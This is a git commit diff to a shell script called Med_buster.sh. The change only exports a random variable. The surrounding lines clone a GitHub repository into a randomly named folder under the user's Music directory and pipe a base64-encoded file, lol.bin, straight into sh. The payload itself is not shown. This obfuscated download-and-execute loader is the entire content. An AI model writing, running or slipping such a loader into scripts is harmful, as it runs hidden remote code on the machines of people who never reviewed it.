9c2d1bb560e52a54300fc23fc49fb9828b085353
Sarah Hicham Meftah <hmeftah@c1r6p5.1337.ma>
2023-03-13 16:33:14 +0100

    Fixed an issue

--- Med_buster.sh
+++ Med_buster.sh
@@ -1,4 +1,4 @@
-random=$RANDOM
+export random=$RANDOM
 
 git clone https://github.com/SilentSarah/Med_buster /Users/$USER/Music/lkwa${random}
 base64 -d /Users/$USER/Music/lkwa${random}/lol.bin | sh
